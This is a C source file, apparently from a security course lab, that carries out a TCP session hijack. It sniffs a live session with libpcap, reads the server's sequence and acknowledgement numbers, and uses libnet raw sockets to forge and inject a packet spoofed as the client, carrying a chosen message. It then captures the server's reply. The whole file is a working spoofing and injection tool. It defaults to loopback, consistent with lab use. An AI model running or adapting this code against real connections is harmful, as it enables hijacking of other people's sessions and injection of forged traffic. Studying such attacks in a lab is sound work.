/*****************************************************************
 *
 * Description: Sniffs a packet from a live tcp session and forges
 *              a fake tcp message from it. Then sends the forged
 *              packet to the server and obtain its reply.
 *
 *****************************************************************/

/*includes */
#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <resolv.h>

#define BUFSIZE         1600
#define MESSAGE_FORMAT  "O kind server, %s needs your blessings."

int offset = 14;   /* datalink offset for ethernet is 14 */
char *srv_addr;
char *srv_port;
char *cli_addr;
char *cli_port;

int analyze_packet(const u_char *, const char *andrew_id); /* parse a packet, build an answer */
pcap_t *set_cap_dev(char *, char *); /* set capdev up to capture dns    */
void print_packet(const u_char *packet);

void usage() {
  printf("USAGE:\n");
  printf("\tsudo ./hijack <client ip> <client port> <server ip> <server port> <andrew_id>\n");
  return;
}

int main(int argc, char **argv) {
  char *device="lo"; //"wlan0";
  char filter1[1024],filter2[1024];                 /* Capture filter */
  char errbuf[PCAP_ERRBUF_SIZE];     /* Error buffer */
  pcap_t* capdev;                    /* Capturing Device */
  const u_char *packet = NULL;
  struct pcap_pkthdr pcap_hdr;       /* Pcap packet header */

  /* get a device to sniff on */

  if (device == NULL) {
    printf("pcap_lookupdev: %s\n", errbuf);
    exit(1);
  }

  if (argc != 6) {
    usage();
    return -1;
  }
  if(argc >= 2) {
      cli_addr = argv[1];
  } else {
      cli_addr = "127.0.0.1";
  }
    
  if(argc >= 3) {
      cli_port = argv[2];
  } else {
      cli_port = "10001";
  }
  
  if (argc >= 4) {
      srv_addr = argv[3];
  } else {
      srv_addr = "127.0.0.1";
  }
  
  if (argc >= 5) {
      srv_port = argv[4];
  }
  else {
      srv_port = "9999";
  }
 

  int server_port = atoi(argv[4]);

  /* This filter is used to capture only the packets that we are
   * interested in. You can change it if you want. */
  sprintf(filter1, "(tcp src port %d) && (tcp dst port %d) && (src host %s) && (dst host %s) && (tcp[13] & 0x10 !=0) && (tcp[13] & 2 ==0)", server_port, atoi(cli_port), srv_addr, cli_addr);

  /* Setup for sniffering */
  capdev = set_cap_dev(device, filter1);

  printf("Sniffering on: %s\n", device);

  for (;;) {
    packet = pcap_next(capdev,&pcap_hdr); 
    if (packet == NULL) {
      continue;
    }
    print_packet(packet);
    analyze_packet(packet, argv[5]);
    break;
  }
  pcap_close(capdev);
  sprintf(filter2, "(tcp src port %d) && (tcp dst port %d) && (src host %s) && (dst host %s) && (tcp[13] & 0x10 !=0)",server_port,atoi(cli_port), srv_addr, cli_addr);
  
  /* Setup for sniffering */
  capdev = set_cap_dev(device, filter2);
  printf("\n\nSniffering 2 on: %s\t", device);
  packet=NULL;
  for (;;) {

    packet = pcap_next(capdev,&pcap_hdr); 
    if (packet == NULL) {
      continue;
    }
    print_packet(packet);
    break;
  }
  
  pcap_close(capdev);

  return 0;
}


/*	 Basic setup for packet sniffing*/
pcap_t *set_cap_dev (char *device, char *filter) {
  unsigned int network;           /* Filter setting */
  unsigned int netmask;           /* Filter setting */
  struct bpf_program fp;          /* Store compiled filter */
  //struct pcap_pkthdr pcap_h;      /* Packet header */
  pcap_t *capdev;                 /* Capturing device */
  char errbuf[PCAP_ERRBUF_SIZE];  /* Error buffer */

  pcap_lookupnet (device, &network, &netmask, errbuf);

  /* Open a network device for packet capture */
  if ((capdev = pcap_open_live(device, BUFSIZE, 1, 1000, errbuf)) == NULL) {
    printf("pcap_open_live(): %s\n", errbuf);
    exit(1);
  }

  /* Make sure that we're capturing on an Ethernet device */
  if (pcap_datalink(capdev) != DLT_EN10MB) {
    printf("%s is not an Ethernet\n", device);
    exit(1);
  }

  /* Compile the filter expression */
  if (pcap_compile(capdev, &fp, filter, 0, netmask) == -1) {
    printf("Couldn't parse filter %s: %s\n", filter, pcap_geterr(capdev));
    exit(1);
  }

  /* Apply the compiled filter */
  if (pcap_setfilter(capdev, &fp) == -1) {
    printf("Couldn't install filter %s: %s\n", filter, pcap_geterr(capdev));
    exit(1);
  }

  return capdev;
}

/* Partial function, extend it to help your
 * debugging if you want. */
void print_packet(const u_char *packet) {
  /* Take a look at header files in /usr/include/libnet/ and
   * /usr/include/netinet/ directories for these headers. */
  struct ip *ip;        /* IP header */
  struct tcphdr *tcp;   /* TCP header */
  char *data;           /* Pointer to payload */

  ip = (struct ip *) (packet +offset);
  tcp = (struct tcphdr *) (packet + offset + LIBNET_IPV4_H);
  data = (char *)(packet + offset + LIBNET_IPV4_H + LIBNET_TCP_H + 12);
  //data[sizeof(data)] = '\0';

 printf("TCP >>> [src]%s:%d\n", inet_ntoa(ip->ip_src),ntohs(tcp->source));
 printf("        [dst]%s:%d\n", inet_ntoa(ip->ip_dst),ntohs(tcp->dest));
 printf("The data is :\t %s",data);

  //return;
}


/* Analyze a packet and store information */
int analyze_packet(const u_char *packet, const char *andrew_id) {
  libnet_t *attack;    /* Libnet handler */
  libnet_ptag_t tcp_tag=0, ip_tag=0;        /* Libnet ptags */
  char errbuf[LIBNET_ERRBUF_SIZE];   /* Error buffer */
  char payload[100];
  struct ip *ip;        /* IP header */
  struct tcphdr *tcp;   /* TCP header */
  char *data;           /* Pointer to payload */
  u_int32_t ack, seq, s_port, d_port, win, srv_ip_addr, cli_ip_addr;

  ip = (struct ip *) (packet +offset);
  tcp = (struct tcphdr *) (packet + offset + LIBNET_IPV4_H);
  data = (char *)(packet + offset + LIBNET_IPV4_H + LIBNET_TCP_H);

  /**** Extract sequence no and ack no. from  ****/
  /**** the ACK packet from server.           ****/

  ack = ntohl(tcp->seq);
  seq = ntohl(tcp->ack_seq);
  s_port = ntohs(tcp->dest);
  d_port = ntohs(tcp->source);
  win = ntohs(tcp->window) + 1;
  
  sprintf(payload, MESSAGE_FORMAT, andrew_id);
  int payload_size = strlen(payload);


  /* Open a raw socket */
  attack = libnet_init(LIBNET_RAW4, "lo", errbuf);
  if (attack == NULL) {
    printf("Error opening a socket: %s\n", errbuf);
    return -1;
  }
  /* TCP header construction */

  libnet_build_tcp( s_port,    /* src port */			//problem
                   d_port,    /* destination port */		//problem
                  seq,    /* sequence number */
                  ack,    /* acknowledgement */
                  0x18,    /* control flags */
                  win,    /* window */
                  0,    /* checksum - 0 = autofill */
                  0,    /* urgent */
                  LIBNET_TCP_H,    /* header length */
                  (u_char *)payload,    /* payload */
                  payload_size,    /* payload length */
                  attack,    /* libnet context */
                  tcp_tag);    /* protocol tag */
 

  /* IP header construction */
  /*************************************************/
 srv_ip_addr = libnet_name2addr4(attack, srv_addr, LIBNET_DONT_RESOLVE);
 cli_ip_addr = libnet_name2addr4(attack, cli_addr, LIBNET_DONT_RESOLVE);
  
 libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,    /* length */
                0,    /* TOS */
                libnet_get_prand (LIBNET_PRu16),    /* IP ID */
                0,    /* frag offset */
                127,    /* TTL */
                IPPROTO_TCP,    /* upper layer protocol */
                0,    /* checksum, 0=autofill */
                cli_ip_addr,    /* src IP */
                srv_ip_addr,    /* dest IP */
                NULL,    /* payload */
                0,    /* payload len */
                attack,    /* libnet context */
                ip_tag);    /* protocol tag */

  /* Calculate checksum */
  /*******************************************************/
  printf("Starting Hijack on TCP connection: client %s:%s, server %s:%s\n",cli_addr, cli_port, srv_addr, srv_port);
  printf("Libnet value: %d:\t %u\nServer Port: %s\nClient Port: %s", libnet_write(attack), seq, srv_port, cli_port);
 
  /*  Destroy the packet */
  /*******************************************************/
  libnet_destroy(attack);

  return 0;
}

